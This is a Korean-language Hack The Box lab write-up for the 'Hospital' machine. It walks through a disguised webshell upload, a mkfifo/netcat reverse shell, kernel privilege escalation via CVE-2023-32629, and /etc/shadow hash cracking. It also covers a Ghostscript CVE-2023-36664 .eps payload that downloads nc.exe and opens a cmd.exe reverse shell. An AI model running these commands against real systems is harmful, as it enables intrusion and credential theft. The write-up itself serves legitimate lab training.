### 사용된 취약점: 파일 업로드 취약점, 커널 취약, Ghostscript command injection
### 초기 침투
![1](https://github.com/murphy701/security/assets/50907298/a5b8506f-5d2a-42ba-8c6a-da5b65643419)
- 스캔 결과
  - 443:webmail(roundcube)
  - 8080:login, upload
  - RPC
<br>
- 파일 업로드 부분이 있어서 웹쉘 업로드를 시도하였지만 거부당함
  ![upload](https://github.com/murphy701/security/assets/50907298/6b5fc513-7e63-4d9e-908f-e14b8dd67c86)

  - 이미지 파일로 만들고 올리는 것으로 시도함
  - touch exploit.jpg; echo test>exploit.jpg로 파일 생성
  - https://github.com/flozz/p0wny-shell?source=post_page-----887fd3d6fee9
    - 해당 웹쉘을 사용(코드만)
  - jpg에 소스코드를 넣고 exploit.jpg파일을 업로드 할 때 burpsuite에서 exploit.jpg를 phar로 변경하여 업로드
  - hospital.htb:8080/uploads.exploit.phar로 연결
 <br></br>
  - 연결한 상태에서 rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ip> 4444 >/tmp/f 로 reverse shell을 연결
  - kali에서는 nc -lnvp 4444로 대기
  - 연결 후 python3 -c 'import pty; pty.spawn("/bin/bash")'실행
    <br></br>

- 연결 이수 uname -r로 커널 버전 확인
- 취약한 버전의 커널인 것으로 확인되어 권한 상승을 시도함
  - CVE-2023-32629
  - 6.2.0, 5.19.0, 5.4.0 우분투에서 취약함
  - 마운트된 파일에 권한 있는 확장 속성 설정을 가능하게 하는 취약점
  - 저번 htb에서 비슷하고 본것 같은 권한상승 방법
- https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629?source=post_page-----887fd3d6fee9
- 해당 웹쉘을 리버스 쉘로 연결된 상태에서 wget <ip>:8001/exploit.sh로 다운로드 시킨다.
- kali에서는 /var/www/html에 exploit.sh를 위치 시키고 python3 -m http.server 8001을 실행한다.
  - 실행하여 권한을 상승한다.
<br></br>

- cat /etc/shadow로 drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash를 확인할 수 있다.
  - pw hash는 sha-512인 것을 알 수 있다.
- john --wordlist=/usr/share/wordlists/rockyou.txt drwilliams.txt로 패스워드를 크랙할 수 있다.
  - 해시 값 크랙 시 파일에 넣을 값으로 shadow파일 전체를 넣는다
  - pw 해시값 만이 아닌 유효 시간 부분을 전부 넣는다
  <br></br>   
- https://10.10.11.241:443으로 접속
  - drwilliams와 크랙으로 얻은 pw로 접속
- mailbox 에서 찾은 내용으로 .eps, ghostscript가 있음
   - ghostscript가 파이프 문자의 권한 유효성 검사 실패로 임의 코드 실행하는 취약점
   - 이를 이용하여 .eps파일에 스크립트 삽입
  <br></br>
- https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?source=post_page-----887fd3d6fee9
- nc.exe, nc64.exe와 해당 웹 쉘을 다운로드한다.
  - python3 -m http.server 8001
    - 주의 사항으로 파이썬 웹 서버 명령 실행 시 경로를 /var/www/html에서 실행해야 함
  - python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.16.24:8001/nc64.exe -o nc.exe" --filename file.eps
    - 해당 명령으로 file.eps에 페이로드를 삽입
- 이후 메일에 file.eps파일을 첨부하여 보내면 해당 서버에 nc64.exe를 다운로드 시킴
<br></br>
- nc64.exe를 다운로드 시킨 상태에서 해당 명령으로 리버스 쉘을 얻는 파일을 다시 만든다
- python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe <ip> 1111 -e cmd.exe" --filename file.eps
  - nc -lnvp 1111로 연결을 기다리고 메시지에 새로운 file.eps를 보내면 리버스 쉘을 획득할 수 있다.
- 이후에 Desktop에서 type user.txt를 이용하여 플래그 값을 출력한다
  <br></br>
### 권한 상승
- documents에서 ghostscript.bat에서 pw를 찾을 수 있다.
  - type ghostscript.bat
- 해당 pw를 이용하여 rpc연결을 시도한다.
  - drwilliams와 찾은 pw를 이용
  - rpcclient -U "drbrown" hospital.htb
### querydispinfo 실행
![querydispinfo](https://github.com/murphy701/security/assets/50907298/5efc379f-077f-466c-abc5-3d7abecc44ab)
- desc 부분에 admin과 guest가 built-in account for ~ the computer/domain이 설명 되어 있음
  - 어드민 정보와 게스트 정보가 같은 도메인에 공유 되어 있음
    - 윈도우에서 흔한 것으로 같은 도메인에서 관리됨
    - 같은 pc에 존재하는 것으로 추정
<br></br>
- 기존에 리버스 쉘로 연결 되어 있던 클라이언트 pc에서 C:\xampp\htdocs에 powny 웹쉘을 업로드
  - curl <ip>:8001/exploit.php -o shell.php
- https://hospital.htb/shell.php로 접속 시 쉘을 얻을 수 있음
  - whoami 실행 시 nt authority\system 결과가 출력되며 권한 상승을 시킨 것을 알 수 있음
- C:\Users\Administrator 에서 root.txt를 읽을 수 있게 됨
<br></br>
### 알게 된 점
- 파이썬으로 웹 서버 실행하여 파일을 다운로드 하게 할 때 /var/www/html에서 python3 -m http.server를 실행해야 정상적으로 작동한다.
